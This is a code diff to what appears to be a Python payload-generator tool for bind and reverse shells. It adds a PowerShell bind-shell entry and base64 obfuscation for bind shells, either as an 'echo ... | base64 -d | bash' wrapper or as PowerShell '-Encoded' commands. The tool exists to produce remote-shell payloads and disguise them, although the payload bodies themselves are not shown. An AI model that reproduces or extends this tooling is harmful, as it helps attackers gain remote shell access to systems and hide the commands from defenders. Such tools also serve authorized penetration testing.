@@ -21,6 +21,7 @@ AVAILABLE_SHELLS = [
             3:("Bind - PHP TCP", BIND_PHP_TCP),
             4:("Bind - Ruby TCP", BIND_RUBY_TCP),
             5:("Bind - Netcat TCP", BIND_NETCAT_TCP),
+            6:("Bind - Powershell TCP", BIND_POWERSHELL_TCP),
             },
 
         # Reverse shell list
@@ -109,6 +110,7 @@ def select_shell(args, shell_type, shell_index):
                         # Powershell encoding code
                         prefix, code = generated.split("-Command")
                         pcode = code.replace("'", "") # Remove single quotes from -Command
+                        pcode = pcode.replace("\\", "") # remove string quotation
                         generated = prefix + "-Encoded " + powershell_base64(pcode)
 
                 if args.urlencode is True:
@@ -123,8 +125,18 @@ def select_shell(args, shell_type, shell_index):
                 name = obj[0]
                 bind = BindShell(name, args.port, code)
                 generated = bind.get()
+
                 if args.base64 is True:
-                    generated = generated.encode("base64").replace("\n", "")
+                    if "powershell" not in name.lower():
+                        generated = "echo " + generated.encode("base64").replace("\n", "") + "|base64 -d|bash"
+                    else:
+                        # Powershell encoding code
+                        prefix, code = generated.split("-Command")
+                        pcode = code.replace("'", "") # Remove single quotes from -Command
+                        pcode = pcode.replace("\\", "") # remove string quotation
+                        generated = prefix + "-Encoded " + powershell_base64(pcode)
+
+
                 if args.urlencode is True:
                     generated = urllib.quote(generated)
                 return generated
